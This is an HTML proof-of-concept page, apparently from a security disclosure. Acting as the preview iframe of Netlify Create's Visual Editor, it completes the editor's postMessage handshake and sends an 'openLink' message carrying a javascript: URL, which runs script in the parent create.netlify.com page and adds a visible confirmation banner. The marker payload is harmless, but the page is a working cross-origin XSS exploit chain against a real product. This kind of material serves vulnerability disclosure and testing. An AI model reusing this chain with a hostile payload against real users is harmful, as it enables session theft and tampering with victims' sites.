<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Visual Editor openLink XSS — owned proof</title>
    <style>
      :root { color-scheme: dark; font-family: Inter, ui-sans-serif, system-ui; background: #0b1020; color: #eef2ff; }
      * { box-sizing: border-box; }
      body { margin: 0; min-height: 100vh; display: grid; place-items: center; background: radial-gradient(circle at 20% 0, #4338ca55, transparent 42%), #0b1020; }
      main { width: min(760px, 92vw); padding: 42px; border: 1px solid #6366f166; border-radius: 22px; background: #111936e8; box-shadow: 0 24px 90px #0009; }
      .tag { color: #a5b4fc; font: 700 12px ui-monospace, monospace; letter-spacing: .12em; text-transform: uppercase; }
      h1 { margin: 18px 0 12px; font-size: clamp(36px, 6vw, 64px); line-height: 1; letter-spacing: -.045em; }
      p { color: #c7d2fe; line-height: 1.6; }
      button { margin-top: 24px; border: 0; border-radius: 12px; padding: 14px 20px; color: white; background: #4f46e5; font: 700 16px inherit; cursor: pointer; }
      button:disabled { cursor: wait; opacity: .55; }
      #status { margin-top: 18px; color: #a5b4fc; font: 13px ui-monospace, monospace; }
    </style>
  </head>
  <body>
    <main data-sb-object-id="content/index.json">
      <span class="tag">Owned security fixture · separate candidate</span>
      <h1 data-sb-field-path="title">Visual Editor openLink proof</h1>
      <p data-sb-field-path="description">This harmless test asks the trusted Create parent to open a link supplied by its configured preview. The payload only adds a visible marker to the parent document.</p>
      <button id="open-proof" type="button" disabled>Open harmless proof link</button>
      <div id="status">Waiting for the Visual Editor handshake…</div>
    </main>
    <script>
      (() => {
        if (parent === window) return;
        const TOP = 'https://create.netlify.com';
        const button = document.getElementById('open-proof');
        const status = document.getElementById('status');
        const pending = new Map();
        let sequence = 0;
        const id = () => `openlink-proof-${Date.now()}-${++sequence}`;
        const send = (type, data, kind) => {
          const requestId = id();
          if (kind) pending.set(requestId, kind);
          parent.postMessage(JSON.stringify({ type, id: requestId, data }), TOP);
          return requestId;
        };
        const respond = (request, data = true) => {
          parent.postMessage(JSON.stringify({ type: 'response', id: id(), response: request.id, data }), TOP);
        };
        const payload = `javascript:(()=>{try{const d=opener.document;d.documentElement.setAttribute('data-netlify-create-openlink-xss','confirmed');let b=d.getElementById('netlify-create-openlink-xss-proof');if(!b){b=d.createElement('div');b.id='netlify-create-openlink-xss-proof';d.body.appendChild(b)}b.textContent='XSS EXECUTION CONFIRMED — preview openLink modified create.netlify.com';Object.assign(b.style,{position:'fixed',zIndex:'2147483647',top:'12px',left:'50%',transform:'translateX(-50%)',background:'#7f1d1d',color:'white',padding:'14px 22px',font:'700 16px system-ui',borderRadius:'8px'});document.body.textContent='owned-openlink-proof-executed'}catch(e){document.body.textContent='blocked'}})();void(0)`;

        addEventListener('message', (event) => {
          if (event.origin !== TOP || event.source !== parent || typeof event.data !== 'string') return;
          let message;
          try { message = JSON.parse(event.data); } catch { return; }
          if (message.type === 'verifyOrigin') {
            respond(message, true);
            return;
          }
          if (['navigate', 'setCurrentPageId', 'setSettings', 'setOutlineButtonsState'].includes(message.type)) {
            if (message.type === 'navigate') history.replaceState(null, '', message.data?.url || message.data?.path || '/');
            respond(message, true);
            return;
          }
          if (message.type !== 'response' || !pending.has(message.response)) return;
          const kind = pending.get(message.response);
          pending.delete(message.response);
          if (kind === 'ready') {
            button.disabled = false;
            status.textContent = 'Ready. One normal preview click runs the harmless marker.';
          }
        });

        button.addEventListener('click', () => {
          button.disabled = true;
          status.textContent = 'Sent openLink to the Create parent.';
          document.documentElement.setAttribute('data-openlink-proof-clicked', 'true');
          send('openLink', payload);
        }, { once: true });

        send('ready', { path: '/' }, 'ready');
      })();
    </script>
  </body>
</html>
